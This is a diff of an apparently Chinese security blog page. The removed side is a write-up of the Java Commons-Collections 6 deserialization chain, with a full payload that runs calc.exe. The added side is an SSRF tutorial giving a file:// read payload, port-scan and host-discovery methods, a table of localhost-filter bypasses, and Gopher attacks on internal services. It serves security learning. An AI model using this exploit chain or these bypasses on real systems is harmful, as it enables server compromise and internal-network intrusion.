@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="java-sec: 04. cc6, outlaws&#39;s blog">
+    <meta name="keywords" content="SSRF, outlaws&#39;s blog">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>java-sec: 04. cc6 | outlaws&#39;s blog</title>
+    <title>SSRF | outlaws&#39;s blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -313,12 +313,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/4.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/12.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">java-sec: 04. cc6</h1>
+                    <h1 class="description center-align post-title">SSRF</h1>
                 </div>
             </div>
         </div>
@@ -434,20 +434,12 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/java/">
-                                <span class="chip bg-color">java</span>
+                            <a href="/tags/%E5%B8%B8%E8%A7%84Web%E6%BC%8F%E6%B4%9E/">
+                                <span class="chip bg-color">常规Web漏洞</span>
                             </a>
                         
-                            <a href="/tags/LazyMap/">
-                                <span class="chip bg-color">LazyMap</span>
-                            </a>
-                        
-                            <a href="/tags/cc6/">
-                                <span class="chip bg-color">cc6</span>
-                            </a>
-                        
-                            <a href="/tags/TiedMapEntry/">
-                                <span class="chip bg-color">TiedMapEntry</span>
+                            <a href="/tags/SSRF/">
+                                <span class="chip bg-color">SSRF</span>
                             </a>
                         
                     </div>
@@ -462,7 +454,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2022-07-16
+                    2022-10-12
                 </div>
                 
 
@@ -486,92 +478,106 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="CommonCollections6"><a href="#CommonCollections6" class="headerlink" title="CommonCollections6"></a>CommonCollections6</h1><p>无条件限制，JDK全版本通用。</p>
-<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><h3 id="完整payload"><a href="#完整payload" class="headerlink" title="完整payload"></a>完整payload</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//1</span>
-<span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>
-                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
-                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
-                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
-                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"calc.exe"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
-                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
-        <span class="token punctuation">}</span><span class="token punctuation">;</span>
-        <span class="token class-name">Transformer</span> transformerChain <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token comment">//2</span>
-        <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span> innerMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">,</span> <span class="token operator">?</span><span class="token punctuation">&gt;</span></span> outerMap <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>innerMap<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token class-name">TiedMapEntry</span> tiedMapEntry <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TiedMapEntry</span><span class="token punctuation">(</span>outerMap<span class="token punctuation">,</span><span class="token string">"key"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span><span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span> expMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        expMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>tiedMapEntry<span class="token punctuation">,</span><span class="token string">"value"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        outerMap<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token string">"key"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token comment">//3</span>
-        <span class="token class-name">Field</span> factoryField <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"factory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        factoryField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        factoryField<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>outerMap<span class="token punctuation">,</span>transformerChain<span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token comment">//4</span>
-        <span class="token class-name">ByteArrayOutputStream</span> byteArrayOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token class-name">ObjectOutputStream</span> objectOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>byteArrayOutputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>
-        objectOutputStream<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>expMap<span class="token punctuation">)</span><span class="token punctuation">;</span>
-        objectOutputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token class-name">ObjectInputStream</span> objectInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>byteArrayOutputStream<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        objectInputStream<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+                <h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>SSRF（Server Side Request Forgery,  服务端请求伪造）服务端漏洞。通常被用来攻击服务端的内部系统。</p>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>简单讲就是服务端实现了一个功能，代为访问用户提交的目标。</p>
+<h2 id="业务场景"><a href="#业务场景" class="headerlink" title="业务场景"></a>业务场景</h2><p>需要服务端做为中转的场景，如因为跨域问题服务端代为下载存放在其他站点的文件。</p>
+<h2 id="测试思路"><a href="#测试思路" class="headerlink" title="测试思路"></a>测试思路</h2><p>注意HTTP请求中值为URL格式的字段。</p>
+<p>但有一个点容易忽略，如果是服务端代为下载文件，burp suite的proxy-http history中并不会出现该条请求。</p>
+<h2 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h2><ul>
+<li>以漏洞服务端作为中转攻击内网</li>
+<li>本地文件泄露，进而造成信息泄露</li>
+<li>读取或更新内部资源</li>
+<li>内网信息收集</li>
+<li>绕过安全限制</li>
+</ul>
+<h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><p>SSRF共有三种类型echo、bool、none，分别为有回显、bool回显、无回显。</p>
+<h3 id="echo"><a href="#echo" class="headerlink" title="echo"></a>echo</h3><p>中转请求发送完成后将响应返回给客户端</p>
+<p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221012202950650.png" alt="image-20221012202950650"></p>
+<h3 id="bool"><a href="#bool" class="headerlink" title="bool"></a>bool</h3><p>中转请求发送后将响应不返回给客户端详细的响应，只是告诉客户端是否请求成功</p>
+<p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221012203151731.png" alt="image-20221012203151731"></p>
+<h3 id="none"><a href="#none" class="headerlink" title="none"></a>none</h3><p>中转请求发送后只是告诉客户端已请求</p>
+<p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221012203300634.png" alt="image-20221012203300634"></p>
+<p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221012203306849.png" alt="image-20221012203306849"></p>
+<h2 id="支持的协议"><a href="#支持的协议" class="headerlink" title="支持的协议"></a>支持的协议</h2><p>有<code>http</code> <code>https</code> <code>file</code> <code>dict</code> <code>gopher</code> <code>ftp</code> <code>telnet</code> <code>ldap</code>等，主要还是看服务端再次发起请求的方式支持哪些协议。</p>
+<h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><h3 id="读取本地文件"><a href="#读取本地文件" class="headerlink" title="读取本地文件"></a>读取本地文件</h3><p>只能在echo类型下使用，利用file协议</p>
+<pre class="line-numbers language-none"><code class="language-none">/api/vuls/ssrf/echo?url=file:///c:/flag.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<h3 id="payload分析"><a href="#payload分析" class="headerlink" title="payload分析"></a>payload分析</h3><p>payload主要分为4个部分:</p>
-<p>1.构造命令执行的恶意类，即获得Runtime.getRuntime().exec(“calc”);</p>
-<p>2.构造反序列化的利用链</p>
-<p>3.为了保证本地不触发命令，在put之后再更改LazyMap中factory的值</p>
-<p>4.生成反序列化流并序列化</p>
-<h4 id="TiedMapEntry"><a href="#TiedMapEntry" class="headerlink" title="TiedMapEntry"></a>TiedMapEntry</h4><p>CC6中新用到的一个类。Entry可以简单理解为一个键值对，Map是多个键值对。</p>
-<h4 id="调用流程"><a href="#调用流程" class="headerlink" title="调用流程"></a>调用流程</h4><p>这次我们反方向来分析，通过<a href="https://outlaws-bai.github.io/2022/07/09/java-sec-03-cc1-way2/">cc1-way2</a>，我们可以知道只要想办法通过反序列化调用LazyMap#get()，并使其运行到factory.transform(key)这里，就能触发命令执行，因为factory使我们构造好的ChainedTransformer。</p>
-<p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20220716162106822.png" alt="image-20220716162106822"></p>
-<p>那么按照这个思路，应该去找调用了LazyMap#get()的点，这里直接分析结果吧，先行者们已经帮我们找到了TiedMapEntry，TiedMapEntry#getValue()会调用，只要使得其中的map是LazyMap即可</p>
-<p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20220716161218387.png" alt="image-20220716161218387"></p>
-<p>继续找调用了TiedMapEntry#getValue()的方法，可以看到TiedMapEntry#hashCode()就调用了getValue()</p>
-<p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20220716162119403.png" alt="image-20220716162119403"></p>
-<p>看到hashCode我们就想到了<a href="https://outlaws-bai.github.io/2022/07/01/java-sec-01-urldns/">URLDNS</a>，当HashMap#readObject()被调用时，会调用它的hash()。</p>
-<p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20220716162354087.png" alt="image-20220716162354087"></p>
-<p>而hash()又会调用当前HashMap中key的hashCode()方法</p>
-<p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20220716162559697.png" alt="image-20220716162559697"></p>
-<p>因此只要使得HashMap中的key为TiedMapEntry的实例化对象，就可以将整个链条串起来。</p>
-<h3 id="细节点"><a href="#细节点" class="headerlink" title="细节点"></a>细节点</h3><h4 id="第2部分代码为什么要remove-“key”"><a href="#第2部分代码为什么要remove-“key”" class="headerlink" title="第2部分代码为什么要remove(“key”)"></a>第2部分代码为什么要remove(“key”)</h4><p>我们去掉这块代码运行会发现无法触发计算器，我们跟进调试会发现在LazyMap#get()并没有走入if中</p>
-<p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20220716163225198.png" alt="image-20220716163225198"></p>
-<p>因为LazyMap的map中已经存在key，那么怎么解决呢，remove就可以了。</p>
-<pre class="line-numbers language-java" data-language="java"><code class="language-java">outerMap<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token string">"key"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>这里的原因我们也看一下，在LazyMap#get()中打一个断点，我们会发现这里被调用了两次，第一次进入了if，第二次没有进入。第一次进入if有个put操作，会将key put进LazyMap中，第二次当然就不进入了。</p>
-<p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20220716164702577.png" alt="image-20220716164702577"></p>
-<p>那么这里为什么第一次会被调用呢，继续寻找其实问题出在</p>
-<pre class="line-numbers language-java" data-language="java"><code class="language-java">expMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>tiedMapEntry<span class="token punctuation">,</span><span class="token string">"value"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>HashMap#put()会调用HashMap#hash()，再走到LazyMap#get()方法，相当于把我们的反序列化流程都走了一遍，导致了LazyMap#get()在反序列化时LazyMap的map已经有一个key了。</p>
-<h4 id="为什么有第3部分代码"><a href="#为什么有第3部分代码" class="headerlink" title="为什么有第3部分代码"></a>为什么有第3部分代码</h4><p>这里有两个变动，一个原来在CC1中我们会直接将生成的ChainedTransformer用于初始化LazyMap</p>
-<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">,</span> <span class="token operator">?</span><span class="token punctuation">&gt;</span></span> outerMap <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>innerMap<span class="token punctuation">,</span> transformerChain<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>而在这里我们传入了一个无用的ChainedTransformer</p>
-<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">,</span> <span class="token operator">?</span><span class="token punctuation">&gt;</span></span> outerMap <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>innerMap<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>另一个就是多了第3部分代码。</p>
-<p>其实理解了上边为什么要remove就可以理解了。</p>
-<pre class="line-numbers language-java" data-language="java"><code class="language-java">expMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>tiedMapEntry<span class="token punctuation">,</span><span class="token string">"value"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>会导致在本地走了一遍我们构造好的反序列化链从而导致本地会触发一次，所以我们选择在put前传入一个无用的ChainedTransformer，在put之后再利用第3段代码，修改LazyMap中的factory变量。</p>
-<h2 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h2><pre class="line-numbers language-none"><code class="language-none">ObjectInputStream#readObject()
-HashMap#readObject()
-HashMap#hash()
-TiedMapEntry#hashCode()
-TiedMapEntry#getValue()
-LazyMap#get()
-ChainedTransformer#transform()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-
-
-
-
-
-
-
-
-
-
+<p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221012204135549.png" alt="image-20221012204135549"></p>
+<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>三种类型均可，只是判断的方式不同</p>
+<p>在echo、bool类型下直接http协议通过响应结果即可判断</p>
+<p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221012211237404.png" alt="image-20221012211237404"></p>
+<p>在none类型下，只能通过响应时间判断，前提请求不是异步的</p>
+<p>例如端口开放：4ms</p>
+<p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221012210907172.png" alt="image-20221012210907172"></p>
+<p>例如端口不开放：2000ms</p>
+<p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221012210846342.png" alt="image-20221012210846342"></p>
+<h3 id="内网主机发现"><a href="#内网主机发现" class="headerlink" title="内网主机发现"></a>内网主机发现</h3><p>与端口扫描测试方式类似，但首先得知道内网肯定会开放的端口，例如在java微服务内网中，web服务采用默认端口8080的话，可以使用http://{host}:8080扫描，再通过响应内容/响应时间判断。</p>
+<h3 id="绕过安全限制"><a href="#绕过安全限制" class="headerlink" title="绕过安全限制"></a>绕过安全限制</h3><p>假设在外网出口做了一些安全限制，比如path名单，这个时候就可以通过ssrf绕过</p>
+<h3 id="攻击内网脆弱组件"><a href="#攻击内网脆弱组件" class="headerlink" title="攻击内网脆弱组件"></a>攻击内网脆弱组件</h3><p>主要利用Gopher协议，可以看下方关于Gopher的介绍。</p>
+<p>简单讲就是Gopher协议允许data段携带类似socket的请求报文来发送请求</p>
+<h2 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h2><p>先来看一下URL的结构</p>
+<p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221012231003524.png" alt="image-20221012231003524"></p>
+<table>
+<thead>
+<tr>
+<th>限制</th>
+<th>绕过方式</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>host不等于localhost/127.0.0.1</td>
+<td>域名解析到内网</td>
+<td>sudo.cc A记录解析到127.0.0.1</td>
+</tr>
+<tr>
+<td>host不等于localhost/127.0.0.1</td>
+<td><code>0</code> <code>0.0.0.0</code>，仅linux</td>
+<td><a target="_blank" rel="noopener" href="http://0.0.0.0/">http://0</a><br><a target="_blank" rel="noopener" href="http://0.0.0.0/">http://0.0.0.0</a></td>
+</tr>
+<tr>
+<td>host不等于localhost/127.0.0.1</td>
+<td>特殊数字</td>
+<td><a target="_blank" rel="noopener" href="http://127.0.0.1/">http://1②7.0.0.1</a></td>
+</tr>
+<tr>
+<td>host不等于localhost/127.0.0.1</td>
+<td>句号替换.</td>
+<td><a target="_blank" rel="noopener" href="http://127.0.0.1/">http://127。0。0。1</a></td>
+</tr>
+<tr>
+<td>host不等于localhost/127.0.0.1</td>
+<td>省略</td>
+<td><a target="_blank" rel="noopener" href="http://127.0.0.1/">http://127.1</a></td>
+</tr>
+<tr>
+<td>host不等于localhost/127.0.0.1</td>
+<td>进制转换</td>
+<td><a target="_blank" rel="noopener" href="http://127.0.0.1/">http://0177.0.0.1</a><br><a target="_blank" rel="noopener" href="http://127.0.0.1/">http://0x7f.0.0.1</a><br><a target="_blank" rel="noopener" href="http://127.0.0.1/">http://2130706433</a></td>
+</tr>
+<tr>
+<td>服务端先做一次DNS解析，再判断解析出的host值</td>
+<td>DNS重绑定</td>
+<td>简单讲就是设置域名的TTL为0，这时候DNS解析和后续发起请求就会存在一个时间差，以此来绕过。</td>
+</tr>
+<tr>
+<td>authority.startswith()！= 数字</td>
+<td>@</td>
+<td><a target="_blank" rel="noopener" href="http://c@127.0.0.1/">http://c@127.0.0.1</a></td>
+</tr>
+<tr>
+<td>authority.endsswith!=数字</td>
+<td>#</td>
+<td><a href="http://127.0.0.1%23123">http://127.0.0.1%23123</a></td>
+</tr>
+</tbody></table>
+<h2 id="Gopher协议"><a href="#Gopher协议" class="headerlink" title="Gopher协议"></a>Gopher协议</h2><h3 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h3><p>Gopher是Internet上一个非常有名的信息查找系统，它将Internet上的文件组织成某种索引，很方便地将用户从Internet的一处带到另一处。在WWW出现之前，Gopher是Internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用tcp 70端口。但在WWW出现后，Gopher失去了昔日的辉煌。现在它基本过时。</p>
+<h3 id="格式"><a href="#格式" class="headerlink" title="格式"></a>格式</h3><p><code>gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_data</code></p>
+<p>默认端口是70，后边的data可以理解为socket请求的数据报文。</p>
+<p>需要注意的是换行符需要使用<code>\r\n</code> </p>
+<h3 id="用途"><a href="#用途" class="headerlink" title="用途"></a>用途</h3><p>Gopher 协议可以做很多事情，特别是在 SSRF 中可以发挥很多重要的作用。利用此协议可以攻击内网的 FTP、Telnet、Redis、Memcache，也可以进行 GET、POST等HTTP 请求。这极大拓宽了 SSRF 的攻击面。</p>
+<h3 id="轮子"><a href="#轮子" class="headerlink" title="轮子"></a>轮子</h3><p><a target="_blank" rel="noopener" href="https://github.com/tarunkant/Gopherus">https://github.com/tarunkant/Gopherus</a> 做了一些协议的封装</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://tttang.com/archive/1648/">https://tttang.com/archive/1648/</a></p>
 
                 
             </div>
@@ -598,7 +604,7 @@ ChainedTransformer#transform()<span aria-hidden="true" class="line-numbers-rows"
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://outlaws-bai.github.io/2022/07/16/java-sec-04-cc6/">https://outlaws-bai.github.io/2022/07/16/java-sec-04-cc6/</a>
+                    <a href="https://outlaws-bai.github.io/2022/10/12/ssrf/">https://outlaws-bai.github.io/2022/10/12/ssrf/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -636,20 +642,12 @@ ChainedTransformer#transform()<span aria-hidden="true" class="line-numbers-rows"
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/java/">
-                                    <span class="chip bg-color">java</span>
+                                <a href="/tags/%E5%B8%B8%E8%A7%84Web%E6%BC%8F%E6%B4%9E/">
+                                    <span class="chip bg-color">常规Web漏洞</span>
                                 </a>
                             
-                                <a href="/tags/LazyMap/">
-                                    <span class="chip bg-color">LazyMap</span>
-                                </a>
-                            
-                                <a href="/tags/cc6/">
-                                    <span class="chip bg-color">cc6</span>
-                                </a>
-                            
-                                <a href="/tags/TiedMapEntry/">
-                                    <span class="chip bg-color">TiedMapEntry</span>
+                                <a href="/tags/SSRF/">
+                                    <span class="chip bg-color">SSRF</span>
                                 </a>
                             
                         </div>
@@ -695,17 +693,18 @@ ChainedTransformer#transform()<span aria-hidden="true" class="line-numbers-rows"
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2022/10/08/sql-zhu-ru/">
+                <a href="/2022/10/12/ssrf/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/17.jpg" class="responsive-img" alt="SQL 注入">
+                        <img src="/medias/featureimages/12.jpg" class="responsive-img" alt="SSRF">
                         
-                        <span class="card-title">SQL 注入</span>
+                        <span class="card-title">SSRF</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -715,9 +714,9 @@ ChainedTransformer#transform()<span aria-hidden="true" class="line-numbers-rows"
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-10-08
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-10-12
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -726,6 +725,7 @@ ChainedTransformer#transform()<span aria-hidden="true" class="line-numbers-rows"
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -733,8 +733,8 @@ ChainedTransformer#transform()<span aria-hidden="true" class="line-numbers-rows"
                         <span class="chip bg-color">常规Web漏洞</span>
                     </a>
                     
-                    <a href="/tags/SQL%E6%B3%A8%E5%85%A5/">
-                        <span class="chip bg-color">SQL注入</span>
+                    <a href="/tags/SSRF/">
+                        <span class="chip bg-color">SSRF</span>
                     </a>
                     
                 </div>
@@ -748,13 +748,13 @@ ChainedTransformer#transform()<span aria-hidden="true" class="line-numbers-rows"
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2022/07/09/java-sec-03-cc1-way2/">
+                <a href="/2022/10/10/sqlmap-qian-xi/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="java-sec: 03. cc1-way2">
+                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="sqlmap 浅析">
                         
-                        <span class="card-title">java-sec: 03. cc1-way2</span>
+                        <span class="card-title">sqlmap 浅析</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -765,7 +765,7 @@ ChainedTransformer#transform()<span aria-hidden="true" class="line-numbers-rows"
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-07-09
